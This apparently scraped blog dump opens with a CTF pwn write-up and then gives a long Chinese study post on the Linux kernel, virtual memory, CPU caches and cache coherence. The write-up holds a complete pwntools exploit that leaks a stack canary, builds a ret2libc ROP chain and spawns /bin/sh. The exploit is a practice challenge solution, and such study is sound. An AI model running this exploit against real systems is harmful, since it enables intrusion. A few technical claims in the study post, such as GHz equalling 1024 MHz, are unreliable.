*#p=remote(&#x27;node4.buuoj.cn&#x27;,27865)p=process(&#x27;./pwn&#x27;)elf=ELF(&#x27;./pwn&#x27;)context.log_level=&#x27;debug&#x27;#泄露canaryp.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)payload=&#x27;a&#x27;*(0x80+8)p.sendline(payload)p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)p.recvuntil(&#x27;a\\n&#x27;)canary=u64(p.recv(7).rjust(8,b&#x27;\\x00&#x27;))pop_rdi=0x400a93puts_got=elf.got[&#x27;puts&#x27;]puts_plt=0x400690main_addr=0x400908payload=b&#x27;a&#x27;*(0x80+8)+p64(canary)+p64(0)payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)p.sendline(payload) payload总长明显是超过0x100的 但是gdb动调看了一下 确实是能写进去的 你直接打断点是看不到这些栈的内容的 这一段在高地址处 因为是之前执行过的栈 所以你需要用 set $rsp &#x3D; $rsp - 0x68来调整一下rsp寄存器的位置 因为stack是以sp寄存器为0来延申的 这里还有一点是要注意的 此时我们一直是在while循环中 在执行完一连串的指令后 并不会跳转到返回地址 因为这并不属于一个栈帧的结束 从栈上的地址逐渐降低也可以看出来 所以我们需要手动退出while循环 剩下的就没什么好说的了 完整exp： from pwn import *from LibcSearcher import *#p=remote(&#x27;node4.buuoj.cn&#x27;,27865)p=process(&#x27;./pwn&#x27;)elf=ELF(&#x27;./pwn&#x27;)context.log_level=&#x27;debug&#x27;#泄露canaryp.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)payload=&#x27;a&#x27;*(0x80+8)p.sendline(payload)p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)p.recvuntil(&#x27;a\\n&#x27;)canary=u64(p.recv(7).rjust(8,b&#x27;\\x00&#x27;))pop_rdi=0x400a93puts_got=elf.got[&#x27;puts&#x27;]puts_plt=0x400690main_addr=0x400908payload=b&#x27;a&#x27;*(0x80+8)+p64(canary)+p64(0)payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)p.sendline(payload)p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;3&#x27;)p.recv()puts_addr=u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base=puts_addr-libc.dump(&#x27;puts&#x27;)system=libc_base+libc.dump(&#x27;system&#x27;)binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload=b&#x27;a&#x27;*(0x80+8)+p64(canary)+p64(0)payload+=p64(pop_rdi)+p64(binsh)+p64(system)p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)p.sendline(payload)p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)p.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"计组原理","slug":"计组原理","date":"2022-12-14T12:10:07.000Z","updated":"2023-09-14T17:21:16.000Z","comments":true,"path":"2022/12/14/计组原理/","link":"","permalink":"http://example.com/2022/12/14/%E8%AE%A1%E7%BB%84%E5%8E%9F%E7%90%86/","excerpt":"","text":"前言已经学习了pwn一段时间 自从开始接触堆以后 就越发感觉计组原理的重要性 终有一日也是要自己读源码 自己挖洞的 所以从现在开始扎实基础知识 并且同时在刷c语言题的时候 遇到了Segmentation Fault的报错 打算弄懂 没想到这一下子就是扯出一整块知识 本篇的篇幅将会十分长 将从0开始写起 梳理和补缺知识点 并且由于是构建一个逻辑性的知识梳理 所以不会像wiki一样详细 可能大部分是一个体系的指导或者记录一些难懂的知识点 并且这种基础知识 不同于呆板的文科学习 如果只是背诵八股文 那么依然达不到用处 希望读者阅读完整篇后 能够形成自己的理解 并且 本文一部分是参照着&lt;&lt;小林图解计算机&gt;&gt;来写的 建议还是去看他的 能够梳理更清楚的框架 Linux内核1你可以把linux内核理解为一个中介 其负责硬件和软件的通信 对应用程序来说 他有什么请求的时候就会将其通过内核传递给硬件 而内核又充当一个底层驱动程序 对设备和组件进行寻址 并且内核是应用程序逻辑上的最底层 同时 内核也相当于一个库 系统调用即是通过这个库实现 应用程序进行系统调用就像调用普通函数一样 如图所示 为GNU&#x2F;linux的基本体系结构 蓝色部分是用户空间 下方是内核空间 内核空间的最上方是系统调用接口 下面依次是通用的内核代码和特殊的内核代码(略) 内核也可以拆分成两部分 微内核和宏内核 微内核又可以称为中央内核 内核的一些基本操作是基于其实现的 其他的功能是交给一些独立进程 这些进程通过特定的通信接口和内核通信 宏内核 你可以将其理解为一个整体 一个文件 其包含了内核的所有代码和五个子系统 在宏内核中 任意一个函数都可以访问到内核的任意地方 五个子系统分别是 进程调度 内存管理 虚拟文件系统 网络接口和进程间通信 其中比较重要的是进程调度和内存管理两个系统 这里拿出来说说 其他的可自行了解 进程调度：linux系统是一个动态的系统 怎么理解这句话 其通过不断变化的各种进程来适应不断变化的计算需求 也就是说 linux中的所有操作 你都可以将其视为一个进程 比如说 我接下来编译如下的二进制文件 #include&lt;stdio.h&gt;int main()&#123;close(1);close(2);system(&quot;/bin/sh&quot;);return 0;&#125; 按理来说应该会直接进行了系统调用 随后我们直接cat flag就能获取flag了是吧 但是运行之后发现 没有回显 这是因为关闭了文件描述符1和2 其对应着标准输出和标准错误 文件描述符相当于一个索引值 其代表的是一个进程 也就是说 在当前终端 输出(即与屏幕的通信接口)被关闭了 这个进程被中断了 那么这里可以用重定向(不解释) 回归正文 linux中的所有进程都源于一个父进程 即fork函数 先调用了这个函数 然后才有了其他的子进程 并且 每一个子进程都有其自己的PID(可以理解为名字) 比如我们可以用 ps -e来查看当前所有的进程 (进程数量过多 这里仅仅这是截取了开头的小部分) 不过这里的PID在进程结束以后 是可以被其他的进程获取的 即其是重复使用的 可见进程对于linux系统的重要性 所以 内核中的其他四个子系统都是依赖于进程调度的 通过其来挂起或者恢复进程 当一个进程需要用到其不能得到的资源时 他会调起其他的进程 而自己会进入睡眠状态 分为两种:可被打断的睡眠和不可被打断 区别在于字面意思 收到信号以后 前者就会恢复进程 当然了 进程的信息肯定不单单只有PID 其还包括进程的优先级、地址的空间等信息 这些内容都会存储在其(单个进程)的一个独立的数据结构中 这个结构称为进程控制块 进程管理也就是管理这些块 内存管理: 提起内存 那么牵扯到的东西就多了 小到cpu的缓存 大到虚拟内存 需要极大的篇幅来叙述 所以我们接下来将偏移正文很长时间 来从0朔源起内存这一个概念 内存最早的图灵机也有内存的概念 如果其要计算1+1 那么就会将1 + 1这三个放上带子 随后由读写头读入到控制器中 这一点和现如今使用的I&#x2F;O总线类似 其分为地址总线 数据总线 控制总线 数据总线将读写到的数据传输给控制总线(I&#x2F;O总线不在这里展开) 这一做法主要是因为数据的读取速度远远慢于计算速度 并且这样可以减少读取数据的次数 做个直观的比喻 你掉落了100根牙签在地上，没有缓冲区的情况是 你弯腰捡完一根牙签就起身把他放回桌子上，接下来继续重复流程 而有了缓冲区以后，你弯腰捡完牙签，你会先把他放在手上，等手中的牙签数量足够多的时候，你才会起身放回桌面 cpu中的缓存概念也类似于上述 cpu拥有三级缓存 简称为 L1 L2 L3 每级缓存逐渐递增缓存量 而读取速度逐渐减少 L1和L2是每一个cpu核心所特有的 而L3通常是几个核心共用 这三级缓存采用的SRAM(静态存储器) 其特点是价格高昂 并且断电后数据就会消失 但是因为其优秀的读取速度 被广泛运用在cpu缓存中 这里额外提一嘴扩展 我们经常会听到cpu超频 这个说法还得从cpu如何执行指令说起 在很多非科班的编程语言培训和你第一节计算机导论课上都会提到 低级语言和高级语言 你只知道一个概念 就是计算机读不懂你写的程序 比如c语言 他需要经过编译 将其转化成计算器能读懂的机器码 这其中的过程可不是能简单用编译两个字来概括的 就比如用gcc来编译一个c语言程序举例 我们编写了一个输出hello world的程序 接着编译这个程序 他会经历四个阶段 : 预处理阶段 编译阶段 汇编阶段 链接阶段 预处理阶段: 这个阶段主要是将我们程序调用的头文件插入到程序文本中 接着由a.c得到a.i 文件扩展名发生了变化 编译阶段: 生成了一个汇编语言程序 文件扩展名变成了s 并且每条汇编语句还对应着一条低级机器语言 汇编阶段: 将文件翻译成机器语言 打包在一个可重定位的二进制文件中 后缀名变为o （这里的可重定位你可以理解为是为了接下来的链接） 链接阶段: 将文件进行静态链接或者动态链接 区别在于是否通过libc库调用函数(如果pwn学到了ret2libc 应该对这块的过程很了解 这里不过多赘述) 接着 这些机器指令被传给了计算机 他需要经历三个阶段 才能从接收到实现 ： Fetch（取指）Decode（译码）Execute（执行指令） 具体的功能不过多赘述 不过从字面意思应该也能理解各步骤的作用 cpu实现这些步骤也是需要时间的 所花费的时间以时间周期为基本单位来衡量 而cpu的主频就是cpu运算速度的单位，cpu的运算速度单位有MHz、GHz，其中GHz&#x3D;1024MHz 但是并不意味着主频越大 cpu的性能越好 这还要参考指令集 发热 等等因素 接着我们说回到内存 基础的我就懒得写了 毕竟好理解 网上资料也多 实在不行我的个人博客里也有提到内存地址之类的概念 为什么会有虚拟内存这个概念？当我们电脑的物理内存不够时 虚拟内存机制可以支持计算机在硬盘中划出一块空间来充当内存使用 并且多个程序可以共有同一块内存区 大大提高了计算机的运算性能和效率 虚拟内存的实现有三种方式 分页 分段 段页式 分页: 以下所叙述的 前提是没有开启虚拟存储机制(不赘述 自行了解) 接下来我们清楚两个主角 物理内存和虚拟内存 所谓的分页是将这二者划分成大小相同的”块” 前者称为页框 后者为页面 而虚拟内存是远远大于物理内存的 所以其分配到的”块”是不能都有对应的物理内存的 为什么这么说？ 我们先得了解cpu的寻址是如何计算的 用32位cpu举例来说 这里引入一个概念 I&#x2F;O总线 I&#x2F;O总线三种总线: 地址总线 数据总线 控制总线 这里只介绍第一种 地址总线 最底层的数据是通过高低电压来传输的 比如说想要传输5这个值 那么就需要三个电压 101 如果只有一条地址总线 那么需要传输三次 这样一位一位传输的方式，称为串行，下一个 bit 必须等待上一个 bit 传输完成才能进行传输 要想提高效率 就需要增加地址总线 但是也不能无脑增加 32位的cpu自身的位宽只有32 要想让他跨级传输64位甚至更多的地址位宽 这明显是不现实的 所以最好的情况下是cpu的位宽刚好和地址位宽一致 所以32位cpu能够寻址到的内存大小是4gb ps: 这一块不懂的可以看一下下面这段 截取自《小林图解计算机》 如果地址总线只有 1 条，那每次只能表示 「0 或 1」这两种地址，所以 CPU 能操作的内存地址最大数量为 2（2^1）个（注意，不要理解成同时能操作 2 个内存地址）； 如果地址总线有 2 条，那么能表示 00、01、10、11 这四种地址，所以 CPU 能操作的内存地址最大数量为 4（2^2）个。 说回到虚拟内存为什么比物理内存大得多 32位的情况下 物理内存最大支持4GB 但是虚拟内存是每个进程所独立拥有的 这样才能确保虚拟内存地址不冲突 而进程是不会只有一个的 所以这种情况下 势必会出现虚拟内存的页面对应不上物理内存的页框 这种问题称为缺页中断 出现这种情况时 系统会从物理内存中挑选一个使用最少的页框 将其内容存放回硬盘 这样就腾出了一个新的页面 接着重新映射到这个空闲的页 我们所提到的这些操作 是由MMU（内存管理单元）来实现的 包括映射和虚拟内存的分配 了解一下就好 扩展的话自己百度百度吧 接下里的内容就需要带脑子看了 虽然说一直都需要脑子 我们来介绍一下 虚拟内存的页面是如何索引到物理内存的 每一个虚拟地址都由两部分组成 页号和页内偏移 页号是页表的索引 页表中存储的是物理内存每页框的基地址 这个类似于libc基址 页内偏移加上页表中的基地址 就索引到了物理地址 然后页表实际上是存储在MMU中 这里的索引其实有点类似于ret2dl的知识点 虽然说这个github上有很多开源的工具可以做到脚本攻击 但是建议还是自己去阅读理解 但是这样的索引机制其实存在一个缺陷 假设32位的情况下 虚拟内存有4GB 假设一个页为4kb 那么就分成了一百万个页 就对应着一百万个页表 页表存储的是物理内存地址的基址 32位情况下需要4字节 这就需要4MB 你会觉得这样也很小 占用不到哪里去 但是你要知道计算机在运行时一般不会只有一个进程 如果你上面按照我说的查看了你虚拟机里的所有进程 你就会知道这个4MB会被乘以多少 为了解决这个问题 还有一种多项页表 还是按照上文的数据假设 对于一个进程来说 一共有4mb的一百万个页表项 如果这些页表继续进行页号的索引 即形成二级页表 二级页表仍然由页表项索引指向一级页表 分配方案为 1024个二级页表 每个页表中仍然有1024个页表项 这样可以索引到1,048,576个一级页表 但是你想 一级页表占用4kb 其进行了二级页表分页后 二级页表的大小是4MB 那这样不多了内存吗？ 但是 你要知道不是每个进程都会占用4GB的虚拟内存 往往会剩余很多 我们一级页表是为了覆盖整个物理内存 才需要不管其有没有占用满 都需要一一对应上 但是二级页表不用这种担心 所以其实大部分情况下 二级页表是分配不到那么多的 所以实际上 增加二级页表机制以后 一个进程所需要的页表项空间为： 4KB+(二级页表占用率)x4MB 得到的值是小于原本的4MB的 这样子就成功节约了空间 下面为补充知识 个人认为可掌握可不掌握 上图是页表项的详细结构 其中 页框号就是页号 用来索引物理内存地址 相当重要 “在&#x2F;不在”位的值是一个布尔类型 1时代表此页表项所指引的页框不在虚拟内存上 如果调用到了这个页表项 就会触发缺页中断 保护位字面意思 用来防止非法调用 上图是比较低级的页表项 好的页表项还会有三位 代表可读 可写 可执行 修改位 如果这个页表项所指引页面被修改了 那么其对应在硬盘上的值也必须被修改 如果没有 那么这个页面就可以直接被丢弃 差不多你可以理解为 你在玩游戏 你使用了一个道具 那么虚拟内存调用到这个的时候 就会把你硬盘中道具的 分段: 这一部分还是很简单的 至少对于分页来说 将虚拟内存分为了多个段落 并且每个段落的长度并不是相等的 这部分和glibc内存管理是一样的 这里就不重复说了 讲一点不一样的 和分页机制类似 分段机制下的虚拟内存地址也包括两个部分 段选择子和段内偏移量 段选择子是段表的索引 而段表中存储的值是这个段映射的物理内存地址的基地址 加上段内偏移量后 就是物理内存地址 但是不同于分页的是 段存在着很大的缺陷 就是内存碎片的问题 因为段所对应的物理内存并不会是连续的一块空间 这么说不好理解 举个例子 一共有1024mb的内存空间 浏览器占了512mb 视频播放器128mb 图片管理器占了256mb 这时候如果把视频播放器的进程终止了 按理来说应该还有128mb(原本空余剩下的)+128mb(视频播放器腾出来的) 但是我们仍然打不开一个256mb的进程 因为这里的256mb的内存并不是连续的 中间是断开的 这就出现了外部内存碎片 那么相对的 还有内部内存碎片 比如我们打开一个视频播放器 但是我们实际上使用的内存只有几十mb 但是这个进程占用的高达256mb 这就出现了内存的浪费 并且分段机制下的内存交换的效率还很低 什么是内存交换 当我们出现了外部内存碎片的情况下 解决办法就是将图片管理器的内存接到浏览器的后面 先把这一块内存写到硬盘上 再读取回来 就接在了浏览器的后面 但是由于这样的内存交换需要将整个进程和硬盘交互 但是我们前面已经讲过了 硬盘的读写速度是远远比不上内存的 所以会被效率造成严重的拖累 段页式: 字面意思 结合了分段和分页两种机制的一种虚拟内存分配方式 其将虚拟内存按照逻辑 分段后 再段中分页 然后和物理内存对应 这样的优点就是又有分段试的管理又有分页式的调用 缺点就是在调用的过程中要不断的查表 既有段表又有页表 增加了硬件成本 接下来详细介绍一下段页式内存映射的原理 虚拟内存这回由三部分构成 段号 段内页号 页内偏移 有了前面的基础 这回就很好理解了 内存先访问段表 然后访问页表 接着加上页内偏移 就得到了物理内存地址 到这里我们就已经普及完了内存的一些知识点 理解完这些你应该对内存差不多有了大概的概念 接着我们说回到linux内核的子系统之一内存管理 Linux内核232位计算机的情况下 linux的虚拟内存分为两个部分 一是3GB大小的用户空间 二是1GB大小的内核空间 内核空间是所有进程所共享的 Linux内核所需求的内存一般都是以字节为单位 所以对于使用分页机制来说 若直接分配一页内存 会造成内存浪费 于是有一个叫slab分配器的东西 来专门负责小内存分配 不过其依然是通过申请大内存 然后对自己申请来的内存进行细分管理 除了分配小内存外 其还有第二个作用 就是提供一个类似于堆块缓存区的东西 (给不是pwn手的简单介绍一下堆块缓存区bins 就是比如说申请了一个范围大小的chunk 将其释放以后 其不会回到原本的内存里面 会被放到大小对应的垃圾桶(bins) 如果下次调用小于或者等于(并不是都适用的 要分辨是哪种bins) 就会从bins中分配) 这样子的好处就是当内核频繁调用小内存时 可以快速分配对象 提高效率 不过总得用slab分配器的术语来描述一下: slab维护着对象的缓存 内核中有些结构 初始化所花费的时间高于为其分配空间的时间 所以就会新增一个slab使用构造函数为其初始化 即使这个结构被释放了 他也会保持初始化状态 下次生成就不用初始化 如果你会一点汇编 你会发现 经常性的会出现地址跳转的指令 比如此时正在执行0x1000地址处的指令 现在要跳转到0x1100 你以为只是很简单的跳转？ 其实不然 原理涉及到了slab的着色机制 我们前面已经说了 cpu有自己的三级缓存 在执行指令时 一级缓存是交互最快的地方 而缓存中调用地址是采取缓存行的形式 比如说此时缓存行一行是64字节 那么: 再假设此时读取的物理内存基址是0x1000 那么第0缓存行读取的地址范围就是0x1000~0x1040 但是这时候要调用0x1100地址处的指令呢 是不是就得将0x1000-0x1040物理内存地址的数据写回硬盘 然后载入0x1100-0x1140 但是这样子如果频繁调用的话 效率太低 造成大量的时间消耗 于是采取了slab着色 为0x1100带上偏移 这样子计算的时候就可以代入到第1缓存行 这样子就不用频繁交换 所以着色其实就是加上偏移 只不过不同对象的偏移不一样 颜色也不一样 ps:slab内容远远不及于此 但是我感觉深究下去也不是个头 并且现阶段没有必要了解那么深 所以点到为此 CPU首先需要知道cpu是怎么执行程序的 CPU又称中央处理器 字面意思是计算机的核心 和人脑一样的地位 其内部包括许多零件 诸如寄存器 控制单元 逻辑运算单元等 其中寄存器负责管理运算数据的存储 以及指令地址和指令内容 分别由三种寄存器种类存储: 通用寄存器 程序计数器 指令寄存器 并且cpu拥有自己的缓存区 称为cache 分别有L1 L2 L3 其中L1缓存区分为指令缓存和数据缓存 二者大小一致 cpu对于cache的读写速度远远大于内存 而上述三个cache 随着数字的增大 缓存空间逐渐增加 读写速度逐渐降低 cpu可以拥有多个核心 而每个核心都有自己特有的L1 L2 cache，L3 cache是所有核心所共享的 cpu和计算机的交互是通过IO总线来实现的 IO总线分为 地址总线 控制总线 数据总线 当cpu读写数据的时候 先通过地址总线来确定目标的地址 再通过控制总线决定是写入还是写出 最后由数据总线传输数据 cpu是如何执行程序的呢? 如果你学过学校教的计算机组成原理 你应该知道冯诺依曼模型 cpu执行程序相当于一行一行执行代码 而执行代码又是将一行代码拆分成指令和数据 其中数据的总类也很多样 全局变量和局部变量 二者还可以延申出不同的数据类型 int double等 例如puts函数输出的字符串也是数据 其会保存在rodata段 指令实际上是一串二进制的机器码 每条指令都有各自的机器码 cpu通过解析机器码来了解指令需求 指令的机器码解析由cpu的指令集负责 而不同的cpu的指令集不同 也就对应不同的汇编语言和机器码 下面举例MIPS指令集来解析一下指令的机器码的构造 MIPS指令集一共有三种格式 每种格式的长度都为32位 前六位是操作码 用来表示该指令作用 后26位根据不同格式构造不同 R格式用于逻辑和算术运算 划分出来的六个区块大小分别为6 5 5 5 5 6位 如果操作码不够描述指令 函数码也可以用来描述 I格式用于数据传输和条件分支 J格式用于跳转地址 构成是三者中最简单的 除了操作码其余都是跳转的地址 举一个R类型的指令 比如add $0,$1,$2 目标寄存器为$0 第一个操作数是$1 第二个操作数是$2 add的操作码为0 函数码为32 所以指令编码后转化成的机器码为 000000 00001 00010 00000 00000 32 cpu解析指令后将其分为数据段和正文段 数据段用来存放变量等 正文段用来存放指令 cpu有一个专门用来存放指令地址的 称其为程序计数器 其存放的指令地址为下一个要执行的指令 cpu先根据程序计数器索引指令 随后通过控制单元操控地址总线访问对应地址 随后利用数据总线传输数据到对应寄存器 接着程序计数器自增 自增大小根据操作系统位数有关 为一个字长 随后程序根据指令类型判断 如果为计算类型的指令 交给逻辑运算单元 如果是存储类型交给控制单元 大部分cpu遵从的是四个固定步骤来执行指令 分别是取指令 指令译码 执行指令 数据回写 取指令(Fetch): 通过程序计数器读取指令地址 指令译码(Decode): 对指令进行解码 执行指令(Execution): cpu执行指令 数据回写(Store): 程序将数据写回对应寄存器或者内存 我们称上述四个步骤为指令周期 cpu执行每一个步骤的时间称为时钟周期 如果时钟频率越快 时钟周期就越短 cpu的执行速度也越快 时钟频率和cpu的主频相关 也就是我们常说的几GHZ 比如2.4GHZ 代表着一秒可以触发2.4G次的脉冲信号 每一次脉冲信号的高低电频转化就是一次时钟周期 另外 cpu为什么还存在原码 补码 反码 原码是对于计算机中二进制的一种表达方式 首位额外增加了符号位 正数是0 负数是1 比如10进制数字1用源码表示就是000000001 但是原码不能直接用于计算 比如两个十进制数字1+(-1)&#x3D;0 如果整个计算过程用原码来表示的话就是 000000001 + 100000001 &#x3D; 100000010 最后的结果是-2 明显计算错误 因此计算机用补码来表达负数 所谓补码就是把负数的原码全部取反再加上1 所以-1的补码就是 011111111 而反码就是原码向补码转化的过度值 也就是还没有加上1时的数值 比如-1的反码是011111110 接下来我们再来讲一下二进制是如何表示小数的 10.625这个数 在二进制中实际上是1010.101 小数点前面的是正数幂 后则是负数幂 1010.101转化为十进制是 但是你会发现也有很多数 比如0.1是不能用二进制表示完全的 这种时候就会产生偏差 如果将二进制的0.1转化回十进制 得到的值是近似于0.1的 0.0001100110……. 我们提到过的二进制数1010.101如果用规格化存储 得到是1.010101 x 2*3 其中010101称之为尾数 3为指数 用来规范小数点的位置 更多细节这里不扩展 感兴趣的可以去这个博客了解 2.7 为什么 0.1 + 0.2 不等于 0.3 ？ | 小林coding (xiaolincoding.com) 接着我们来利用下面的这个程序进入cpu cache的存储内容 #include&lt;stdio.h&gt;int main()&#123; int a[20]=&#123;1,2,3&#125;; printf(&quot;%d&quot;,a[0]);&#125; 当cpu执行printf语句的时候 需要将a[0]的值读入cache 但是cpu并不能刚好读入单个数据或者是刚好适应不同调用情况的字节数据 其单次读写数据的单位是cache line 上文讲述slab着色器的时候也说到过了 这里复述的详细一点 假设此cpu的cache line是64字节 那么当其需要a[0]数据的时候 会把a[0]后面的数据也一并读入 直到满足64字节 第一块64字节的数据会被放置为cache line 0 当需要更多字节的数据的时候 就会依法炮制 放置在cache line1 如此递增 假设cache一共有8行 而内存被分为了32个块 这也就意味着必然会有两块以上的内存共用一块cache line 其遵守的是取模运算 比如说第15个内存块 实际上对应的是第7个cache line 而cpu为了避免搞混单个cache line中的不同内存块 在对应的cache line中还存储了tag标记 相当于slab着色器 除了tag标记外 cache line中还存储着两个重要信息 一个是有效位 一个是偏移量 有效位为0时 不管cache中是否有需要的内存数据 仍然会去内存中读取 偏移量的存在则是因为cpu所需的内存数据并不一定都是刚好一个cache line 就比如说上面的程序 所需的仅仅是cache line中的一个内存片段 也就需要偏移量来界定一个范围 cache line是为了避免频繁的cpu访问内存带来的读写效率降低 但是其存在着一个缺陷 也就是意味着一块cache line中可能并不全是所需要的数据 出现了缓存命中率的问题 其又分为数据缓存命中率和指令缓存命中率 先说数据缓存命中率吧 来看下面的一个程序 #include&lt;stdio.h&gt;int main()&#123; int a[5][20]; for(int i=0;i&lt;5;i++)&#123; printf(&quot;%d &quot;,a[0][i]); &#125; putchar(10); for(int i=0;i&lt;5;i++)&#123; printf(&quot;%d &quot;,a[i][0]); &#125;&#125; 你觉得哪一个for循环执行所消耗的时间会更加短 是第一个? 那为什么呢 其调用的数据在内存地址中都是连续的 也就意味着单次的cache line写入就可以做到覆盖所有要调用的数据 而第二个for循环调用的数据是间断的 需要花费更多的时间在cpu和内存的交互中 当我们需要遍历数组这种情况时 最好选择连续的内存空间 可以有效提高程序的运行时间和数据缓存命中率 而指令缓存命中率是什么呢？ 还是先看一下下面的程序 #include&lt;stdio.h&gt;int main()&#123; int a[20]; // 数组a进行一个随机赋值 这里不演示出来 for(int i=0;i&lt;20;i++)&#123; if(a[i]&gt;0)&#123; a[i]=0; &#125;else&#123; continue; &#125; &#125;&#125; 当数组a进行了赋值后 步入if判断分支 请问是先对数组a中的数据进行一个排序后再判断所消耗的时间快还是直接进行判断 回答这个问题之前我们首先要了解 cpu拥有一个分支预测器 如果cpu能够预测到接下来是步入if语句的哪个分支 就会提前把指令(在这里也就是a[i]&#x3D;0)放入到cache中 于是执行速度就会加快 那么显然 先进行排序再步入if判断语句就可以提高判断后赋值的效率 当我们在实际编写程序的时候 如果你可以确保哪一个步入哪一个分支的概率较高 你可以使用likely和unlikely两种宏 #define likely(x)__builtin_expect( !!(x),1)#define unlikely(x) __builtin_expect( ! !(x),0)#include&lt;stdio.h&gt;int main()&#123; int a[20]; for(int i=0;i&lt;20;i++)&#123; if(likely(a[i]&lt;100))&#123; puts(&quot;a&quot;); &#125; &#125;&#125; 当括号中的判断式为true的概率大时 就使用likely宏 与此同时 我们前面提高过 每个cpu核心都有自己的L1 L2 cache 数据会被优先放到这两个cache中存放 方便cpu调用 但是 如果是单核cpu的话 只能执行一个线程 但是系统给多个需要被执行的线程分配时间片 每个线程执行一段时间后 就执行另外一个线程 所以看起来就好像所有的线程都在同时执行一样 但是现在的cpu基本都是多核心的 这也就意味着线程可能会在多个核心中执行 这就导致了缓存命中率的问题 上述所提到的cache和内存的数据交互 只是cache单方面写入内存的数据 如果cpu要执行b &#x3D; a+1的操作呢? 那么就需要将cache的数据b写回到内存 这一操作是怎么实现的 下面我们就来讲两种写入数据的办法 分别是写直达和写回 写直达: 这一种办法是最简单粗暴的 也就是连同cache和内存 一起写入数据 流程为 先判断cache中是否有需要被写入的数据 如果有 就先写入cache 再写入内存 如果没有 就直接写入内存 这种办法的逻辑简单 比较浪费cpu的执行时间 因为每次写入都需要访问内存 写回: 写回办法有效解决了前者出现的问题 当要进行写操作的时候 先判断cache是否已经有对应数据了 如果有的话 则更新数据到cache中 并且把数据标记为脏的 如果cache中是其他内存地址的数据的话 先判断这个数据是不是脏的 如果是脏的 那么先将该数据写回到内存中 再从内存中将需要用到的数据写到cache 再覆写cache中的数据 并且标记为脏的 之所以这样做可以看 caching - For Write-Back Cache Policy, why data should first be read from memory, before writing to cache? - Stack Overflow 如果不是脏的话 就只要将需要的数据从内存中写入到cache 再覆写cache 最后标记为脏的 这样下来 就不需要每次写操作都需要访问内存 你可能会觉得 那这样就无法及时的写回内存 但是如果我们的缓存命中率高的话 就不需要频繁的与内存交互 我们一直提到缓存命中率 这是对于同一个核心而言的 如果一个线程由两个核心执行呢 一个计算式: a=b=0 //1a += 1 //2b += 1 //3a += b //4 如果核心A负责式子2和4 核心B负责式子3 接下来注意了 两个核心读入数据到cache中时 读入的都是初始值 对于两个核心来说 a,b最开始的值都是0 核心A执行完式子2了以后 按照上文的写回操作 并不会马上将数据写回到内存中 接下来核心A执行式子4的时候 其和核心B执行的式子3 并没有关联 对于核心A来说 变量a是1 变量b是0 a最后的值是1 但是对于上帝视角的我们来说 最后的结果应该是2 这就是核心A和B的信息差导致的后果 称这种问题为缓存一致性 为了解决这种问题的出现 就需要一种机制来协调不同核心间的cache 也就是当核心A将变量a赋值为了1时 需要通知其他核心的cache 将a同样重新赋值 相当于广播 这种方式称为总线嗅探 这种行为称为写传播 但是光这样还是不足以平衡不同核心之间的信息差 当核心A对于变量a多次赋值 第一次赋值为10 第二次赋值为20 假设核心B接收到的广播顺序是先20再10 那么显然最后变量a在两个核心中的值还是不同 也就需要统一对数据的操作顺序 这种行为称为事务的串行化 当接收到广播后 只有拥有&lt;锁&gt;才能对这个数据的赋值进行修改 要想同时实现事务串行化和写传播 并且优化每次写传播都需要对所有核心广播的问题 诞生了MESI协议 MESI协议包括了四种状态 分别是 已修改 独占 共享 已失效 已修改: 即我们前面提到的脏标记 意味着此时该数据在cache和内存中不一样 独占&#x2F;共享:二者的定义是对于cpu核心而言的 即该数据是否为单个cpu核心所独占 如果处于独占状态 那么写入数据后就不需要写传播 如果处于共享状态 先经过写传播 将其他核心内的数据修改成无效状态 再重新写入数据 已失效: 代表该数据不能被调用 MESI协议的共享机制存在着伪共享的问题 此时核心A和核心B分别负责线程A(a +&#x3D; 1) 线程B(b +&#x3D; 1) 而变量a和b相邻 位于同个cache line范围中 所以此时核心A和核心B的cache line拥有同样的变量 变成共享状态 此时 核心A开始执行线程A 发现其处于共享状态 于是通过总线将核心B的cache line修改为已失效状态 随后进程A结束后 核心A的cache line变化已修改状态 核心B开始执行线程B 发现cache line处于失效状态 于是将拥有和其一样变量的核心A的cache line写回到内存 再从内存中重新读入cache line 随后执行完线程B以后 将新cache line设置为已修改状态 而此时核心A的cache line处于已失效状态 如果核心A和B不断重复各自的线程 实际上就是不断重复上述的操作 频繁的和内存进行交互 cache line的用处微乎其微 这就是伪共享问题 想要解决这一问题 linux内核提供了__cacheline_aligned_in_smp的宏定义 对于该定义 仅使用于多核cpu 下面举例一个程序 #include&lt;stdio.h&gt;int main()&#123; int a; int b;&#125; 此时变量a和b在内存地址上是相邻的 如果将变量b用上__cacheline_aligned_in_smp宏定义 #ifdef CONFIG_SMP#define __cacheline_aligned_in_smp __cacheline_aligned#else#define __cacheline_aligned_in_smp#endif#include&lt;stdio.h&gt;int main()&#123; int a; int b __cacheline_aligned_in_smp;&#125; 此时b的地址就被设置为cache line的对齐地址 但是这种方法实际上是浪费了一部分cache line的空间 来换取效率的提升 接下来我们来讲一下进程和线程的一点知识 为了接下里要讲的软中断做铺垫 每一个进程都有自己独立的内存空间 一个进程可以拥有多个线程 在windows系统中 可以使用任务管理器来查看当前的进程 其中 一个进程可以拥有多个线程 在linux系统中 线程可以被视为一个轻量化的进程 也就是说线程也是被作为一个进程看待 而在JVM(java为了实现跨平台而创建的一个假想计算机)中的线程 拥有自己的程序计数器 虚拟机栈 本地方法栈 这里不额外扩展 感兴趣的可以自行了解 进程是操作系统资源分配的基本单位 而线程是处理器任务调度和执行的基本单位 